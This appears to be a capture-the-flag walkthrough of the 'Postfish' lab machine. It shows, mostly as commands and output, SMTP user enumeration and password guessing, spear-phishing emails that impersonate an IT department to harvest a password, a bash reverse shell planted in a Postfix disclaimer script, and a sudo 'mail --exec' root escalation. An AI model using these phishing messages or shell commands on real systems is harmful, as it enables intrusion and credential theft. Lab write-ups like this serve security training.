@@ -1,0 +1,376 @@
+WALKTHROUGH
+×
+Exploitation Guide for Postfish
+Summary
+In this walkthrough, we will exploit the target via phishing for user credentials. We'll enumerate who to impersonate and who to target in the phishing campaign by guessing user credentials for a department mailbox and reading their messages. We'll then escalate by abusing Postfix disclaimer functionality and misconfigured sudo permissions on the /usr/bin/mail binary.
+
+Enumeration
+Nmap
+We'll begin with an nmap scan.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap 192.168.120.41                             
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 07:49 EDT
+Nmap scan report for 192.168.120.41
+Host is up (0.033s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE
+22/tcp  open  ssh
+25/tcp  open  smtp
+80/tcp  open  http
+110/tcp open  pop3
+143/tcp open  imap
+993/tcp open  imaps
+995/tcp open  pop3s
+This system is running some mail services. While this is interesting, we'll come back to them later. For now, we'll focus on the web service on port 80.
+
+Web Enumeration
+Navigating to port 80 in a web browser (http://192.168.120.41/), we are redirected by the application to http://postfish.off. Let's add this host to our /etc/hosts file.
+
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/hosts                           
+127.0.0.1       localhost
+127.0.1.1       kali
+...
+# Custom hosts
+192.168.120.41 postfish.off
+If we navigate to http://postfish.off now, the website loads successfully. The Our team page (http://postfish.off/team.html) lists four employees: Claire Madison from HR, Mike Ross from IT, Brian Moore from sales, and Sarah Lorem from legal.
+
+SMTP Enumeration
+We now have a possible domain name to work with as well as four persons of interest. Our scan shows that an SMTP server is listening on port 25. Let's start by identifying department mailboxes that exist on the server with smtp-user-enum.
+
+┌──(kali㉿kali)-[~]
+└─$ cat departments.txt 
+hr@postfish.off
+it@postfish.off
+sales@postfish.off
+legal@postfish.off
+
+┌──(kali㉿kali)-[~]
+└─$ smtp-user-enum -M RCPT -U departments.txt -t postfish.off
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... departments.txt
+Target count ............. 1
+Username count ........... 5
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Wed Mar 24 07:56:36 2021 #########
+postfish.off: it@postfish.off exists
+postfish.off: sales@postfish.off exists
+postfish.off: hr@postfish.off exists
+postfish.off: legal@postfish.off exists
+######## Scan completed at Wed Mar 24 07:56:36 2021 #########
+4 results.
+Looks like all four mailboxes exist on the target.
+
+Exploitation
+Reading Emails
+Since our scan showed POP3 and IMAP services running, we'll next try to access these department mailboxes via the POP3 service on port 110. Before we go in "with guns blazing" and try a brute-force approach, let's see if any one of these mailboxes has a simple password we can guess. We'll begin by trying hr:hr, it:it, sales:sales, and legal:legal.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -v postfish.off 110
+postfish.off [192.168.120.41] 110 (pop3) open
++OK Dovecot (Ubuntu) ready.
+USER hr
++OK
+PASS hr
+-ERR [AUTH] Authentication failed.
+USER it
++OK
+PASS it
+-ERR [AUTH] Authentication failed.
+...
+Trying this technique for the HR and IT mailboxes gives us nothing promising. However, we get lucky with the sales department's email credentials.
+
+...
+USER sales
++OK
+PASS sales
++OK Logged in.
+...
+Nice, we were able to get it. Checking if there are any messages in the inbox, we find one.
+
+...
+LIST
++OK 1 messages:
+1 683
+.
+...
+Let's read this message.
+
+...
+RETR 1
++OK 683 octets
+Return-Path: <it@postfish.off>
+X-Original-To: sales@postfish.off
+Delivered-To: sales@postfish.off
+Received: by postfish.off (Postfix, from userid 997)
+        id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
+Received: from x (localhost [127.0.0.1])
+        by postfish.off (Postfix) with SMTP id 7712145434
+        for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
+Subject: ERP Registration Reminder
+Message-Id: <20210331131139.7712145434@postfish.off>
+Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
+From: it@postfish.off
+
+Hi Sales team,
+
+We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.
+
+Regards,
+IT
+.
+QUIT
++OK Logging out.
+...
+This message was sent from the IT department (it@postfish.off) to the sales department (sales@postfish.off). Sounds like the sales department will be expecting en email from IT containing a link to reset their password in the new system.
+
+This looks like a prime opportunity for a phishing campaign!
+
+SSH Attempt
+Before we pursue the phishing vector though, let's see if we can log in as sales:sales via SSH.
+
+┌──(kali㉿kali)-[~]
+└─$ ssh sales@postfish.off
+sales@postfish.off: Permission denied (publickey).
+Unfortunately, it looks like SSH password authentication is forbidden for this user.
+
+Phishing
+Unsuccessful Attempt
+We can try to send an email impersonating the IT department and telling employees from sales to register on the new platform. Let's start interacting with the SMTP service using Netcat.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -v postfish.off 25
+postfish.off [192.168.120.41] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+helo hacker
+250 postfish.off
+...
+We'll send this email from the it@postfish.off mailbox to sales@postfish.off.
+
+...
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+RCPT TO: sales@postfish.off
+250 2.1.5 Ok
+...
+Before sending the message, we'll start a Netcat listener on port 80.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 80
+listening on [any] 80 ...
+Next, we'll enter the message body that will contain a link to our attacking machine. Nothing special needs to be in the link. For example, our message could look like this.
+
+...
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Subject: Password Reset
+
+Hello,
+
+Unfortunately we had a problem during our migration and we had to rebuild our database.
+Please register at http://192.168.118.5/ and let us know if you encounter any problems.
+
+Regards,
+IT
+.
+250 2.0.0 Ok: queued as 3E6F9458E2
+QUIT
+221 2.0.0 Bye
+
+┌──(kali㉿kali)-[~]
+└─$
+Unfortunately, after waiting for a while, there is no activity on our Netcat listener.
+
+Successful Attempt
+We can venture a guess that perhaps individual users of the department are expecting to receive this email in their personal mailboxes. There is only one employee in sales, so our next target is Brian Moore himself. This turns the attack into spear-phishing.
+
+It also presents us with a new problem. We now need to figure out how employees' mailbox names are formed. We can take advantage of SMTP RCPT TO: directive to enumerate possible usernames for Brian.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -v postfish.off 25
+postfish.off [192.168.120.41] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+helo hacker
+250 postfish.off
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+...
+If the recipient we supply is not correct, we will get an error.
+
+...
+RCPT TO: user@postfish.off
+550 5.1.1 <user@postfish.off>: Recipient address rejected: User unknown in local recipient table
+Generally, companies adopt a naming convention, which implies that all mail addresses for the company follow a specific pattern. One such example could be the first letter of the first name followed by the entire lastname, like bmoore. Another example could be b.moore. Yet another example could be simply brian.
+
+Let's try a few of these conventions with Brian Moore until we discover the right one.
+
+...
+RCPT TO: b.moore@postfish.off
+550 5.1.1 <b.moore@postfish.off>: Recipient address rejected: User unknown in local recipient table
+RCPT TO: bmoore@postfish.off
+550 5.1.1 <bmoore@postfish.off>: Recipient address rejected: User unknown in local recipient table
+RCPT TO: brian@postfish.off
+550 5.1.1 <brian@postfish.off>: Recipient address rejected: User unknown in local recipient table
+...
+No luck so far, but let's try another common convention.
+
+RCPT TO: brian.moore@postfish.off
+250 2.1.5 Ok
+...
+Great! Looks like we have found the pattern of how mailbox names are formed at this company. With our Netcat listener still running, let's tailor our malicious message for Brian and send it.
+
+...
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Subject: Password Reset
+
+Hey Brian,
+
+Unfortunately we had a problem during our migration and we had to rebuild our database.
+Please register at http://192.168.118.5/ and let us know if you encounter any problems.
+
+Regards,
+IT
+.
+250 2.0.0 Ok: queued as F0B6F458E2
+QUIT
+221 2.0.0 Bye
+
+┌──(kali㉿kali)-[~]
+└─$
+After about a minute, we get a hit on our Netcat listener.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 80                                     
+listening on [any] 80 ...
+connect to [192.168.118.5] from (UNKNOWN) [192.168.120.172] 50496
+POST / HTTP/1.1
+Host: 192.168.118.5
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 164
+Content-Type: application/x-www-form-urlencoded
+
+first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confirm_password%3DEternaLSunshinE
+Very nice. Seems like Brian Moore fell for the bait and gifted us his credentials. URL-decoding this payload, we find the credentials to be brian.moore:EternaLSunshinE.
+
+SSH
+Let's see if Brian is allowed to SSH using password authentication.
+
+┌──(kali㉿kali)-[~]
+└─$ ssh brian.moore@postfish.off
+brian.moore@postfish.off's password: 
+...
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-64-generic x86_64)
+...
+brian.moore@postfish:~$ whoami
+brian.moore
+This worked nicely, and we are now logged in as Brian.
+
+Escalation
+Postfix Disclaimer Exploitation
+Once we're logged in, we see that Brian is a member of the filter group.
+
+brian.moore@postfish:~$ id
+uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
+Let's find all files that are owned by this group.
+
+brian.moore@postfish:~$ find / -group filter 2>/dev/null
+/etc/postfix/disclaimer
+/var/spool/filter
+Researching what postfix and disclaimer actually are, we find this article on using alterMIME to add a disclaimer to all outgoing emails. The postfix disclaimer functionality is a specific configuration, which allows a pre-determined user (in this case filter) to execute a script when sending or receiving an email.
+
+Continuing reading the article, we see that the /etc/postfix/disclaimer file can actually execute code, and its execution is established in the /etc/postfix/master.cf file.
+
+brian.moore@postfish:~$ cat /etc/postfix/master.cf | grep disclaimer
+dfilt      unix  -       n       n       -       -       pipe flags=Rq user=filter argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
+Since we are in the filter group, we should be able to edit the /etc/postfix/disclaimer file.
+
+brian.moore@postfish:~$ ls -l /etc/postfix/disclaimer
+-rwxrwx--- 1 root filter 1184 Mar 25 12:21 /etc/postfix/disclaimer
+brian.moore@postfish:~$ 
+brian.moore@postfish:~$ cat /etc/postfix/disclaimer
+#!/bin/bash
+# Localize these.
+INSPECT_DIR=/var/spool/filter
+SENDMAIL=/usr/sbin/sendmail
+...
+To exploit this, we can simply write a bash reverse shell to this file.
+
+brian.moore@postfish:~$ echo '#!/bin/bash' > /etc/postfix/disclaimer
+brian.moore@postfish:~$ echo 'bash -i >& /dev/tcp/192.168.118.5/4444 0>&1' >> /etc/postfix/disclaimer
+brian.moore@postfish:~$ cat /etc/postfix/disclaimer
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.118.5/4444 0>&1
+The next time a user receives a message, the disclaimer script should be executed. Let's start a Netcat listener to receive the reverse shell.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 4444
+listening on [any] 4444 ...
+We'll now send Brian another email, the contents of which are irrelevant.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -v postfish.off 25
+postfish.off [192.168.120.41] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+helo hacker
+250 postfish.off
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+RCPT TO: brian.moore@postfish.off
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Pwned!
+.
+250 2.0.0 Ok: queued as 941A745436
+quit
+221 2.0.0 Bye
+
+┌──(kali㉿kali)-[~]
+└─$
+As soon as the message is delivered, the disclaimer script is executed, and we are granted our shell.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 4444         
+listening on [any] 4444 ...
+connect to [192.168.118.5] from postfish.off [192.168.120.172] 46116
+bash: cannot set terminal process group (3738): Inappropriate ioctl for device
+bash: no job control in this shell
+filter@postfish:/var/spool/postfix$ id 
+id
+uid=997(filter) gid=997(filter) groups=997(filter)
+filter@postfish:/var/spool/postfix$
+Sudo
+Let's check our sudo permissions as the user filter.
+
+filter@postfish:/var/spool/postfix$ sudo -l
+sudo -l
+Matching Defaults entries for filter on postfish:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User filter may run the following commands on postfish:
+    (ALL) NOPASSWD: /usr/bin/mail *
+Looks like we can run /usr/bin/mail as root without supplying the password. Researching how we might be able to abuse this misconfiguration leads us to this GTFOBins article. Using this tactic, we can easily spawn a root shell.
+
+filter@postfish:/var/spool/postfix$ whoami
+whoami
+filter
+filter@postfish:/var/spool/postfix$ sudo /usr/bin/mail --exec='!/bin/sh'
+sudo /usr/bin/mail --exec='!/bin/sh'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@postfish:/var/spool/postfix# whoami
+whoami
+root
